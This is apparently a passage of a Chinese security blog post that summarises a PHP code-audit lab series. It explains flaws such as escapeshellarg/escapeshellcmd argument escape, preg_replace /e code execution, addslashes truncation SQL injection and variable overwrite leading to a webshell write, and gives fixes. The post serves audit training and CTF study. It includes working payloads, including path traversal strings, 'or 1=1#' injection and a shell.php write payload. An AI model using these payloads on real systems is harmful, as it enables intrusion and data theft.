class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这里稍微解释一下</p><p>其实是变成了三个字符串的连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">&#x27; #这里是escapeshellarg函数的效果 原来的单引号前面加上\转义</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;-v -d a=1&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>escapeshellcmd</strong>函数</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗  shell 命令执行任意命令的字符进行转义。</p><p>反斜线（\）会在以下字符之前插入：   <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code>   和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code>   仅在不配对儿的时候被转义。   </p><p>当**escapeshellarg()<strong>与</strong>escapeshellcmd()**一起使用时就会出现参数逃逸漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span> -v -d a=<span class="number">1</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>依然是变成了三个部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1270.0.1&#x27;</span> <span class="comment">#没有发生转义 单引号是配对的</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\<span class="string">&#x27;&#x27;</span>  <span class="comment">#从之前的\&#x27; 变成 \\&#x27; 这回是反斜线被转义了 所以单引号是多出来的正好与之前的第三部分的第一个单引号配对了</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v -d a=<span class="number">1</span>\<span class="string">&#x27; #因为第二部分配对了 导致第三部分的单引号多余了 所以根据函数规则 未匹配的单引号会加上反斜线转义</span></span><br></pre></td></tr></table></figure><h4 id="利用场景：-4"><a href="#利用场景：-4" class="headerlink" title="利用场景："></a>利用场景：</h4><p>参数逃逸导致远程代码执行</p><p>ctf也有遇到过</p><h4 id="修复建议：-4"><a href="#修复建议：-4" class="headerlink" title="修复建议："></a>修复建议：</h4><p>不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤</p><h3 id="正则使用不当导致的路径穿越问题"><a href="#正则使用不当导致的路径穿越问题" class="headerlink" title="正则使用不当导致的路径穿越问题"></a>正则使用不当导致的路径穿越问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day6/files/README.md">红日安全]代码审计Day6 - 正则使用不当导致的路径穿越问题</a></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功将其替换成 <strong>replacement</strong> 。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204230021968.png"></p><p>本质上是对正则表达式的绕过</p><p><strong>preg_replace</strong> 中的 <strong>pattern</strong> 部分 ，该正则表达式并未起到过滤目录路径字符的作用。<code>[^a-z.-_]</code>  表示匹配除了 <strong>a</strong> 字符到 <strong>z</strong> 字符、**.** 字符到 <strong>_</strong> 字符之间的所有字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../ config.php</span><br></pre></td></tr></table></figure><p>即可删除config.php文件</p><h4 id="利用场景：-5"><a href="#利用场景：-5" class="headerlink" title="利用场景："></a>利用场景：</h4><p>本质是对正则的绕过，只要正则写的不完善，都可以进行绕过尝试。</p><p>CTF中也有出现过。</p><h4 id="修复建议：-5"><a href="#修复建议：-5" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合业务修改完善正则表达式。</p><h3 id="parse-str函数缺陷"><a href="#parse-str函数缺陷" class="headerlink" title="parse_str函数缺陷"></a>parse_str函数缺陷</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day7/files/README.md">红日安全]代码审计Day7 - parse_str函数缺陷</a></p><p>这个函数的缺陷实际上导致的是一个<strong>变量覆盖</strong>漏洞。</p><blockquote><p><a href="http://php.net/manual/zh/function.parse-str.php"> <strong>parse_str</strong> </a></p><p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p><p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p><p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204230119878.png"></p><h4 id="利用场景：-6"><a href="#利用场景：-6" class="headerlink" title="利用场景："></a>利用场景：</h4><p>白盒审计</p><p>ctf遇到过</p><h4 id="修复建议：-6"><a href="#修复建议：-6" class="headerlink" title="修复建议："></a>修复建议：</h4><p>在注册变量前先判断变量是否存在</p><h3 id="preg-replace函数之命令执行"><a href="#preg-replace函数之命令执行" class="headerlink" title="preg_replace函数之命令执行"></a>preg_replace函数之命令执行</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md">红日安全]代码审计Day8 - preg_replace函数之命令执行</a></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p></blockquote><ul><li><strong>$pattern</strong> 存在 <strong>&#x2F;e</strong> 模式修正符，允许代码执行</li><li><strong>&#x2F;e</strong> 模式修正符，是 **preg_replace() ** 将 <strong>$replacement</strong> 当做php代码来执行</li></ul><p>总结就是 php5.5版本以下，<strong>preg_replace</strong>函数有一个&#x2F;e模式，开启了就会导致代码执行。</p><p><strong>经典问题案例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span>(<span class="params"> <span class="variable">$regex</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>. <span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complexStrtolower</span>(<span class="variable">$regex</span>, <span class="variable">$value</span>).<span class="string">&quot;n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replace 使用了 &#x2F;e 模式，导致可以代码执行，我们可以控制第一个和第三个参数，第二个参数固定为 ‘strtolower(“\1”)’ 字符串。</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong></p><p>如何进行命令执行其他恶意代码？</p><p>这里要用到一个PHP的小<strong>trick</strong>，<strong>反向引用</strong>。</p><p>看了几篇文章，感觉讲的不是很清楚，这里解释一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，</span><br><span class="line">所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。</span><br><span class="line">缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 <span class="string">&#x27;\n&#x27;</span> 访问，</span><br><span class="line">其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">camelize</span>(<span class="params"><span class="variable">$word</span></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(^|_)([a-z])/e&#x27;</span>, <span class="string">&#x27;strtoupper(&quot;\2&quot;)&#x27;</span>, <span class="variable">$word</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码，就是捕获匹配的 <code>(^|_)</code> 和 <code>([a-z])</code> 部分。它们从 1 开始编号，因此您有反向引用 1 和 2。</p><p>1是正则  **(^|_) ** 所匹配到的东西，2是  <strong>([a-z])</strong>  所匹配到的东西。这里还有一个隐藏点 <strong>0 是整个匹配的字符串</strong> 很多文章没讲到这个。</p><p>回到上面的代码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>. <span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>,<span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p>第二个参数中的\\1，实际上就是\1，配合反向引用的规则，\1就是指第一个子匹配项。</p><p>那上面的命令执行，就相当于 <strong>eval(‘strtolower(“满足正则表达式的$value”);’)</strong></p><p>官方 <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong></p><p><strong>.</strong>* 正则匹配任意多个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">变成了语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;);</span><br></pre></td></tr></table></figure><p>但是这个payload是有问题的</p><p>以**.<em><strong>作为参数名是非法的，会自动转化成</strong>_</em>**</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231609346.png"></p><p>图片来自：<a href="https://www.cnblogs.com/HelloCTF/p/13184476.html">https://www.cnblogs.com/HelloCTF/p/13184476.html</a></p><p>稍微修改以下payload即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=<span class="variable">$&#123;phpinfo()&#125;</span></span><br></pre></td></tr></table></figure><p><strong>\S</strong>* 正则匹配任意多个非空白符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`\C`、`\D`、`\H`、`\N`、`\S`、`\V`、`\X` 都能代替</span><br></pre></td></tr></table></figure><p>匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;a=$a&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=hello </span><br><span class="line">a=<span class="variable">$a</span></span><br></pre></td></tr></table></figure><p>为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。</p><h4 id="利用场景：-7"><a href="#利用场景：-7" class="headerlink" title="利用场景："></a>利用场景：</h4><p>PHP版本有限制，可能见到的机会不多。</p><p>ctf出现过作为考点的题目</p><h4 id="修复建议：-7"><a href="#修复建议：-7" class="headerlink" title="修复建议："></a>修复建议：</h4><p>避免使用 <strong>&#x2F;e</strong> 模式修正符</p><h3 id="str-replace函数过滤不当"><a href="#str-replace函数过滤不当" class="headerlink" title="str_replace函数过滤不当"></a>str_replace函数过滤不当</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day9/files/README.md">红日安全]代码审计Day9 - str_replace函数过滤不当</a></p><blockquote><p><a href="http://php.net/manual/zh/function.str-replace.php"> str_replace </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：子字符串替换</p><p><strong>定义</strong> ： <code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</code></p><p>该函数返回一个字符串或者数组。如下：</p><p>str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。</p><p>str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。</p><p>str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。</p></blockquote><p>本质是过滤不严谨</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231919587.png"></p><p>以上代码是将 <strong>..&#x2F;</strong> 字符替换成空，然后进行路径拼接</p><p>payload：**….&#x2F;&#x2F;** 或者 <strong>…&#x2F;.&#x2F;</strong> ，在经过程序的 <strong>str_replace</strong> 函数处理后，都会变成 <strong>..&#x2F;</strong> </p><h4 id="利用场景：-8"><a href="#利用场景：-8" class="headerlink" title="利用场景："></a>利用场景：</h4><p>任意文件读取，任意文件删除……</p><h4 id="修复建议：-8"><a href="#修复建议：-8" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合业务场景进行过滤</p><h3 id="程序未恰当exit导致的问题"><a href="#程序未恰当exit导致的问题" class="headerlink" title="程序未恰当exit导致的问题"></a>程序未恰当exit导致的问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day10/files/README.md">红日安全]代码审计Day10 - 程序未恰当exit导致的问题</a></p><p>本质上代码逻辑有问题，在本应该立即exit退出的地方，没有退出函数，使得程序继续运行，出现非预期的情况。</p><h4 id="利用场景：-9"><a href="#利用场景：-9" class="headerlink" title="利用场景："></a>利用场景：</h4><p>重装漏洞</p><h4 id="修复建议：-9"><a href="#修复建议：-9" class="headerlink" title="修复建议："></a>修复建议：</h4><p>在正确的地方退出程序即可，使用 <strong>die</strong> 、 <strong>exit</strong> 等函数。</p><h3 id="unserialize反序列化漏洞"><a href="#unserialize反序列化漏洞" class="headerlink" title="unserialize反序列化漏洞"></a>unserialize反序列化漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day11/files/README.md">红日安全]代码审计Day11 - unserialize反序列化漏洞</a></p><p>这个可以说是打ctf之前经常能见到。</p><p>这里直接推几篇文章</p><p>这一篇就够了</p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p><h4 id="利用场景：-10"><a href="#利用场景：-10" class="headerlink" title="利用场景："></a>利用场景：</h4><p>构造POP链rce</p><p>ctf</p><h4 id="修复建议：-10"><a href="#修复建议：-10" class="headerlink" title="修复建议："></a>修复建议：</h4><p>不要把用户的输入或者是用户可控的参数值直接放进反序列化的操作中</p><h3 id="误用htmlentities函数引发的漏洞"><a href="#误用htmlentities函数引发的漏洞" class="headerlink" title="误用htmlentities函数引发的漏洞"></a>误用htmlentities函数引发的漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day12/files/README.md">红日安全]代码审计Day12 - 误用htmlentities函数引发的漏洞</a></p><blockquote><p><a href="http://php.net/manual/zh/function.htmlentities.php">htmlentities</a> — 将字符转换为 HTML 转义字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">htmlentities</span> ( <span class="keyword">string</span> <span class="variable">$string</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_COMPAT | ENT_HTML401 [, <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_charset&quot;</span>) [, <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span> ]]] )</span><br></pre></td></tr></table></figure><p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 htmlentities()。</p></blockquote><p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p><ul><li>ENT_COMPAT（默认值）：只转换双引号。</li><li>ENT_QUOTES：两种引号都转换。</li><li>ENT_NOQUOTES：两种引号都不转换。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231947807.png"></p><h4 id="利用场景：-11"><a href="#利用场景：-11" class="headerlink" title="利用场景："></a>利用场景：</h4><p>当参数没设置清楚会导致出现SQL注入、XSS。</p><h4 id="修复建议：-11"><a href="#修复建议：-11" class="headerlink" title="修复建议："></a>修复建议：</h4><p><strong>htmlentities</strong> 这个函数使用的时候，尽量加上可选参数，并且选择 <strong>ENT_QUOTES</strong> 转换单引号和双引号 参数。</p><h3 id="特定场合下addslashes函数的绕过"><a href="#特定场合下addslashes函数的绕过" class="headerlink" title="特定场合下addslashes函数的绕过"></a>特定场合下addslashes函数的绕过</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day13/files/README.md">红日安全]代码审计Day13 - 特定场合下addslashes函数的绕过</a></p><blockquote><p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> addslashes ( <span class="built_in">string</span> $str )</span><br></pre></td></tr></table></figure><p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NULL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231952107.png"></p><p>具体案例：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204231956690.png"></p><p>代码 <strong>第33行</strong> ，通过 <strong>POST</strong> 方式传入 <strong>user</strong> 和 <strong>passwd</strong> 两个参数，通过 <strong>isValid()</strong> 来判断登陆是否合法。我们跟进一下 <strong>isValid()</strong> 这个函数，该函数主要功能代码在 <strong>第12行-第22行</strong> ，我们看到 <strong>13行</strong> 和 <strong>14行</strong> 调用 <strong>sanitizeInput()</strong> 针对 <strong>user</strong> 和 <strong>password</strong> 进行相关处理。</p><p>跟进一下 <strong>sanitizeInput()</strong> ，主要功能代码在 <strong>第24行-第29行</strong> ，这里针对输入的数据调用 <strong>addslashes</strong> 函数进行处理，然后再针对处理后的内容进行长度的判断，如果长度大于20，就只截取前20个字符。</p><p>滤了单引号，正常情况下是没有注入了，那为什么还能导致注入了，原因实际上出在了 <strong>substr</strong> 函数</p><blockquote><p><a href="http://php.net/manual/zh/function.substr.php">substr</a> — 返回字符串的子串</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> substr ( <span class="built_in">string</span> $string , <span class="built_in">int</span> $start [, <span class="built_in">int</span> $length ] )</span><br></pre></td></tr></table></figure><p>作用：返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p></blockquote><p>代码中length默认为20</p><p>我们里可以用他默认的长度为20，设计一个payload</p><p>正常情况输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>会被转换成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>但是经过substr函数的截取</p><p>又变成了</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span><span class="operator">=</span><span class="number">1234567890123456789</span>\</span><br></pre></td></tr></table></figure><p>再结合具体代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user u where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="variable">$pass</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>\将本来是用来闭合user的单引号转义成了正常的单引号，所以签名的单引号与$pass的前一个单引号进行了闭合。</p><p>这里我们让 <strong>pass&#x3D;or 1&#x3D;1#</strong> ，那么最后的sql语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p>sql注入成功。</p><h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景:"></a>利用场景:</h4><p>白盒审计</p><p>ctf</p><h4 id="修复建议：-12"><a href="#修复建议：-12" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合程序逻辑进行代码优化。</p><h3 id="从变量覆盖到getshell"><a href="#从变量覆盖到getshell" class="headerlink" title="从变量覆盖到getshell"></a>从变量覆盖到getshell</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day14/files/README.md">红日安全]代码审计Day14 - 从变量覆盖到getshell</a></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232044601.png"></p><p>在 <strong>第10-11行</strong> 处， <strong>Carrot</strong> 类的构造方法将超全局数组 <strong>$_GET</strong> 进行变量注册，这样即可覆盖 <strong>第8行</strong> 已定义的 <strong>$this-&gt;</strong> 变量。而在 <strong>第16行</strong> 处的析构函数中， <strong>file_put_contents</strong> 函数的第一个参数又是由 <strong>$this-&gt;</strong> 变量拼接的，这就导致我们可以控制写入文件的位置，最终造成任意文件写入问题。下面我们试着使用 <strong>payload</strong> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../<span class="keyword">var</span>/www/html/shell.php&amp;shell=<span class="string">&#x27;,)%0a&lt;?php phpinfo();?&gt;//</span></span><br></pre></td></tr></table></figure><p>shell.php文件中内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;../var/www/html/shell.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lost&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;bought&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span> =&gt; <span class="string">&#x27;\&#x27;,)</span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;//&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里注意，shell变量中的反斜杠\是自动加上的，是给我们传入shell参数的内容中的单引号转义的。</p><h4 id="利用场景：-12"><a href="#利用场景：-12" class="headerlink" title="利用场景："></a>利用场景：</h4><p>变脸覆盖的场景有写shell还有覆盖session登录等等</p><h4 id="修复建议：-13"><a href="#修复建议：-13" class="headerlink" title="修复建议："></a>修复建议：</h4><p>检测变量名是否为PHP原有的超全局数组，如果是则直接退出并告知变量不允许</p><h3 id="SERVER-‘PHP-SELF’-导致的防御失效问题"><a href="#SERVER-‘PHP-SELF’-导致的防御失效问题" class="headerlink" title="$_SERVER[‘PHP_SELF’]导致的防御失效问题"></a>$_SERVER[‘PHP_SELF’]导致的防御失效问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day15/files/README.md">红日安全]代码审计Day15 - $_SERVER[‘PHP_SELF’]导致的防御失效问题</a></p><p>PHP自带的**$_SERVER[‘PHP_SELF’]** 参数是可以控制</p><p><strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：<a href="http://www.test.com/redict/index.php%EF%BC%8C%E9%82%A3%E4%B9%88**PHP_SELF**%E5%B0%B1%E6%98%AF">http://www.test.com/redict/index.php，那么**PHP_SELF**就是</a> &#x2F;redict&#x2F;index.php 。</p><p>但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：<a href="http://www.test.com/redict/index.php/admin%EF%BC%8C%E9%82%A3%E4%B9%88**PHP_SELF**%E5%B0%B1%E6%98%AF/redict/index.php/admin">http://www.test.com/redict/index.php/admin，那么**PHP_SELF**就是/redict/index.php/admin</a> 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p><h4 id="利用场景：-13"><a href="#利用场景：-13" class="headerlink" title="利用场景："></a>利用场景：</h4><p>任意URL跳转</p><p>有一个关于 <strong>360webscan</strong> 的防护脚本一个历史漏洞，正是使用了 <strong>$_SERVER[‘PHP_SELF’]</strong> 这个变量，导致可以绕过360webscan防护脚本的防护，脚本的防护效果失效。</p><h4 id="修复建议：-14"><a href="#修复建议：-14" class="headerlink" 